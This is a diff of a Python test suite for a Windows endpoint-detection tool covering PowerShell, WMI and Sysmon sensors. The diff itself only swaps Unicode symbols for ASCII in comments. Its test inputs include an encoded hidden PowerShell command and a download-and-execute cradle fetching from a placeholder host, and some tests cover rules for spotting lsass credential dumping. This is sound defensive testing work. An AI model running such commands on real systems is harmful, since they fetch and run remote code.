@@ -59,7 +59,7 @@ SAMPLE_4104 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/e
 </Event>"""
 
 
-# ── classifier ──────────────────────────────────────────────────────────────
+# --- classifier ---
 def test_classify_encoded_command_high():
     sev, labels, tech, _ = classify_powershell(
         "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=")
@@ -85,7 +85,7 @@ def test_classify_benign_is_info():
     assert sev == SEV_INFO and labels == []
 
 
-# ── XML parsing ─────────────────────────────────────────────────────────────
+# --- XML parsing ---
 def test_parse_event_xml_extracts_fields():
     ev = parse_event_xml(SAMPLE_4104)
     assert ev["event_id"] == 4104
@@ -105,7 +105,7 @@ def test_parse_bad_xml_returns_empty():
     assert parse_event_xml("not xml <<<") == {}
 
 
-# ── PowerShell sensor mapping ───────────────────────────────────────────────
+# --- PowerShell sensor mapping ---
 def test_powershell_sensor_emits_event():
     captured = []
     s = PowerShellSensor()
@@ -116,12 +116,12 @@ def test_powershell_sensor_emits_event():
     assert isinstance(ev, TelemetryEvent)
     assert ev.category == CAT_PROCESS and ev.activity == "script_block"
     assert ev.actor_pid == 4242
-    assert ev.action == ACT_FLAGGED           # download+IEX ⇒ medium ⇒ flagged
+    assert ev.action == ACT_FLAGGED           # download+IEX => medium => flagged
     assert ev.fields["_dedup"].startswith("11111111")
     assert "download" in ev.labels
 
 
-# ── WMI-Activity sensor (UserData + persistence) ────────────────────────────
+# --- WMI-Activity sensor (UserData + persistence) ---
 SAMPLE_5861 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
   <Provider Name='Microsoft-Windows-WMI-Activity' Guid='{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}'/>
@@ -177,7 +177,7 @@ def test_wmi_sensor_emits_persistence_event():
     assert "powershell" in ev.target["command"].lower()
 
 
-# ── Sysmon sensor ───────────────────────────────────────────────────────────
+# --- Sysmon sensor ---
 def test_parse_hashes():
     h = parse_hashes("SHA256=ABCDEF,MD5=123,IMPHASH=999")
     assert h["sha256"] == "abcdef" and h["imphash"] == "999"
@@ -198,10 +198,10 @@ def test_sysmon_ignores_non_lsass_access():
                                 "GrantedAccess": "0x1410"}) is None
 
 
-# ── Generalisation: HELD-OUT masks not in the enumerated list ───────────────
+# --- Generalisation: HELD-OUT masks not in the enumerated list ---
 # The detector used to key on an exact set of six masks. These masks are NOT in
 # that set, so under the old code they would have scored only MEDIUM and slipped
-# under the alert bar — the exact "attacker changes one flag and evades" gap. A
+# under the alert bar - the exact "attacker changes one flag and evades" gap. A
 # novel dumper still needs PROCESS_VM_READ (0x10) to read lsass memory, so the
 # generalised check must catch all of them at HIGH.
 def test_sysmon_lsass_heldout_masks_still_high():
@@ -214,7 +214,7 @@ def test_sysmon_lsass_heldout_masks_still_high():
         assert args["severity"] == SEV_HIGH, f"{novel} should be HIGH (has VM_READ)"
 
 
-# FP boundary: a query-only open of lsass (no VM_READ — cannot read memory) must
+# FP boundary: a query-only open of lsass (no VM_READ - cannot read memory) must
 # NOT be escalated to HIGH. This is how the generalisation stays precise:
 # "reads lsass memory" is credential theft, "queries lsass info" is routine.
 def test_sysmon_lsass_query_only_not_escalated():
@@ -234,10 +234,10 @@ def test_sysmon_remote_thread_injection_high():
 
 
 def test_sysmon_process_emits_only_when_suspicious_with_context():
-    # Benign process (notepad from System32, benign parent) → skipped.
+    # Benign process (notepad from System32, benign parent) -> skipped.
     assert classify_sysmon(1, {"ProcessId": "1", "Image": r"C:\Windows\System32\notepad.exe",
                                "ParentImage": r"C:\Windows\explorer.exe"}) is None
-    # Office → PowerShell → suspicious, enriched with context.
+    # Office -> PowerShell -> suspicious, enriched with context.
     args = classify_sysmon(1, {
         "ProcessId": "4321",
         "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
@@ -255,7 +255,7 @@ def test_sysmon_eid1_emits_discovery_labels_for_the_burst_combiner():
     """Discovery commands must survive EID 1's severity gate.
 
     They are INFO by design (a lone `whoami` must never alert), so the gate
-    would normally drop them — but the reconnaissance-burst sequence IOA can
+    would normally drop them - but the reconnaissance-burst sequence IOA can
     only fire if it SEES several of them, and these commands exit in
     milliseconds, so Sysmon EID 1 / Security 4688 is the only source that
     reliably catches them at all. The 2s poller loses the race. If EID 1
@@ -271,7 +271,7 @@ def test_sysmon_eid1_emits_discovery_labels_for_the_burst_combiner():
         assert args is not None, f"{cmdline} was dropped by the EID 1 gate"
         assert "discovery_command" in args["labels"]
         assert tid in args["technique"]
-        # Still INFO — this must not become a standalone alert.
+        # Still INFO - this must not become a standalone alert.
         assert args["severity"] == SEV_INFO
 
     # A benign non-discovery process is still dropped (gate unchanged).
@@ -319,7 +319,7 @@ def test_sysmon_sensor_emit_end_to_end():
     assert te.fields["technique"].startswith("T1003.001")
 
 
-# ── framework: dedup ────────────────────────────────────────────────────────
+# --- framework: dedup ---
 def _ev(dedup="x", pid=1):
     return TelemetryEvent(category=CAT_PROCESS, activity="script_block",
                           actor_pid=pid, fields={"_dedup": dedup})
@@ -336,10 +336,10 @@ def test_dedup_expires_after_window():
     mgr = SensorManager(sink=lambda e: None, dedup_window=0.2)
     assert mgr._is_duplicate(_ev("A")) is False
     time.sleep(0.3)
-    assert mgr._is_duplicate(_ev("A")) is False       # window elapsed → not dup
+    assert mgr._is_duplicate(_ev("A")) is False       # window elapsed -> not dup
 
 
-# ── framework: bounded backpressure ─────────────────────────────────────────
+# --- framework: bounded backpressure ---
 def test_backpressure_is_bounded():
     mgr = SensorManager(sink=lambda e: None, queue_max=5)
     for i in range(20):
@@ -348,14 +348,14 @@ def test_backpressure_is_bounded():
     assert mgr.metrics["dropped_backpressure"] >= 10   # overflow counted
 
 
-# ── framework: end-to-end dispatch + dedup to sink ──────────────────────────
+# --- framework: end-to-end dispatch + dedup to sink ---
 def test_end_to_end_dispatch_dedup():
     got = []
     mgr = SensorManager(sink=got.append, dedup_window=5.0)
     mgr.start()
     try:
         mgr._submit(_ev("same"))
-        mgr._submit(_ev("same"))         # duplicate → dropped
+        mgr._submit(_ev("same"))         # duplicate -> dropped
         mgr._submit(_ev("other"))
         time.sleep(0.4)
     finally:
@@ -365,7 +365,7 @@ def test_end_to_end_dispatch_dedup():
     assert mgr.metrics["dropped_dedup"] >= 1
 
 
-# ── framework: watchdog restarts a dead sensor ──────────────────────────────
+# --- framework: watchdog restarts a dead sensor ---
 class _DyingSensor(Sensor):
     name = "dying"
 
@@ -377,7 +377,7 @@ class _DyingSensor(Sensor):
         import threading
         self.starts += 1
         self._running = True
-        # A thread that exits immediately, leaving _running True → is_running()
+        # A thread that exits immediately, leaving _running True -> is_running()
         # is False, which the watchdog must notice and restart.
         self._thread = threading.Thread(target=lambda: None)
         self._thread.start()
@@ -397,7 +397,7 @@ def test_watchdog_restarts_dead_sensor():
     assert mgr.metrics["restarts"] >= 1
 
 
-# ── framework: failure isolation ────────────────────────────────────────────
+# --- framework: failure isolation ---
 class _RaisingSensor(Sensor):
     name = "raiser"
     interval = 0.1
@@ -428,7 +428,7 @@ def test_failure_isolation():
     assert mgr.is_healthy() in (True, False)  # never raised
 
 
-# ── framework: clean shutdown drains ────────────────────────────────────────
+# --- framework: clean shutdown drains ---
 def test_clean_shutdown_joins():
     mgr = SensorManager(sink=lambda e: None)
     mgr.start()
@@ -439,7 +439,7 @@ def test_clean_shutdown_joins():
     assert not mgr._dispatch_thread.is_alive()   # joined cleanly
 
 
-# ── live smoke test (self-skips) ────────────────────────────────────────────
+# --- live smoke test (self-skips) ---
 def test_live_channel_available_smoke():
     if not IS_WIN:
         print("SKIP live channel (non-Windows)")
@@ -451,7 +451,7 @@ def test_live_channel_available_smoke():
         s._collect_once()                 # baseline seed; must not raise
 
 
-# ── benchmarks (measure, assert only sane bounds) ───────────────────────────
+# --- benchmarks (measure, assert only sane bounds) ---
 def test_benchmarks():
     N = 20000
     script = "IEX (New-Object Net.WebClient).DownloadString('http://x/y'); -enc AAAA"
